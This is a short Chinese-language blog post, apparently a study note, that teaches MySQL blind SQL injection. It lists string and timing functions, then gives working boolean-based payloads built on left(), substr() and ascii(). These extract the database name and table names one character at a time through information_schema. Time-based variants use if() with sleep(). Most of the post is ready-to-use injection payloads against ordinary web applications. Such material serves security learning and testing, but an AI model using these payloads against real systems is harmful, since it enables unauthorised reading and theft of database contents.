---
title: "MySQL 盲注"
date: 2017-12-25T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['mysql','sqli']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

盲注分为布尔盲注和时间盲注.

<!--more-->

## 函数

盲注需要用到的函数.

```
left(a,b) 从左侧截取a的前b位.
left(12345,2) --> 12

length(a) 获取a的长度.
length(12345) --> 5

substr(a,b,c)、mid(a,b,c) 从b开始 截取a的c位.
substr(12345,1,2) --> 12

ascii(a)、ord(a) 转a为ascii码.
ascii(1) --> 49

if(a,b,c) 如果a成立 执行b 否则执行c.
if(1>0,1,0) --> 1

sleep(a) 运行a秒.

benchmark(a,b) 执行b a次.
```

## 布尔盲注

数据库.

```
id=1 and length(database())=8 --> True

使用 left().

id=1 and left(database(),1)='s' --> True
id=1 and left(database(),2)='se' --> True
id=1 and left(database(),3)='sec' --> True
...

使用 substr() + ascii() / mid() + ord().

id=1 and ascii(substr(database(),1,1))=115 --> True
id=1 and ascii(substr(database(),2,1))=101 --> True
id=1 and ascii(substr(database(),3,1))=99 --> True
...

如果不嫌蛋疼还可以用 hex().

id=1 and hex(substr(database(),1,1))=0x73 --> True
...
```

表、列、内容.

```
id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 2,1))=4 --> Ture

使用 left().

id=1 and left((select table_name from information_schema.tables where table_schema=database() limit 2,1),1)='u' --> True
id=1 and left((select table_name from information_schema.tables where table_schema=database() limit 2,1),2)='us' --> True
id=1 and left((select table_name from information_schema.tables where table_schema=database() limit 2,1),3)='use' --> True
...

使用 substr() + ascii() / mid() + ord().

id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))=117 --> True
id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),2,1))=115 --> True
id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),3,1))=101 --> True
...

注意使用 limit n,n 限制查询条数.
```

以此类推.

## 时间盲注

多加了一层 if.

```
id=1 and if(length(database())=8,sleep(5),0)
id=1 and sleep(if(length(database())=8,5,0))
```

其他部分和布尔盲注没什么不同.